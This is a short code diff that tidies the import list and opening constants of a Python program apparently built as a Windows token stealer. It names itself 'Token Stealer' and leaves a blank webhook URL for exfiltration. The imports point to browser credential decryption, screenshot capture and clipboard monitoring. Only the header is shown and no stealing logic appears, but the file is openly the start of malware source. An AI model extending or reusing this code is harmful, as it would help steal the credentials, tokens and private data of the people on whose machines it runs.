@@ -1,29 +1,26 @@
-
 import os
+import sys
+import re
+import json
+import base64
+import uuid
+import time
+import socket
+import shutil
 import ctypes
 import threading
-import time
-import requests
-import re
-import base64
-import json
-import win32crypt
-import shutil
-import sys
-import ctypes
-import uuid
-import subprocess
 import platform
 import getpass
 import sqlite3
-import socket
+import subprocess
 from datetime import datetime
-from PIL import ImageGrab
+import win32crypt
+import requests
 import pyperclip
+from PIL import ImageGrab
 from Crypto.Cipher import AES
-import uuid
 from Crypto.Random import get_random_bytes
-import ctypes, sys 
+
 last_clipboard = ""
 WEBHOOK_URL = "" # Replace with your webhook
 WEBHOOK_USERNAME = "Token Stealer" 
